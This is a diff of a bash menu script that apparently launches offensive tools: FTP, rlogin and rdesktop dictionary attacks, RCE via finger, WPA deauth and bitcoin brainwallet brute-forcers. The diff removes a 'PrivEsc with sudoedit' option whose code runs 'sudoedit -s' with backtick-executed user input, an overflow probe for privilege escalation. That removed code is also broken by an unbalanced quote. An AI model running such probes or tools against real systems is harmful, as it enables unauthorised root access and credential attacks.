@@ -648,7 +648,7 @@ while true; do
 	echo -ne " 750. username and password dictionary attack with wget and ftp protocol\t\t751. RCE with finger\n"
 	echo -ne " 754. get RPC info\t\t\t\t755. get RPC connect\n"
 	echo -ne " 756. smb connection\t757. rlogin dictionary attack\t758. rdesktop dictionary attack\n"
-	echo -ne " 9. wifi WPA with deauth attack\t\tPrivEsc with sudoedit\n"
+	echo -ne " 9. wifi WPA with deauth attack\n"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	echo -ne " 511. Isaacdelly/Plutus\t\t\t\t512. dan-v/bruteforce-bitcoin-brainwallet\t\t513. SMH17/bitcoin-hacking-tools\n"
@@ -8554,16 +8554,6 @@ while true; do
 	;;
 	"2230")
 		Clona "fadinglr/Parat"
-	;;
-	"2231")
-		echo "testing sudoedit vulnerability..."
-		sudoedit -s /
-		echo "Digit a command with arguments"
-		read -p (example, perl -e 'print "A" x 65536'): " CMD
-		if [[ "$CMD" != "" ]];
-		then
-			sudoedit -s '\' `$CMD` 
-		fi
 	;;
 	*)
 		echo "error, invalid choice"
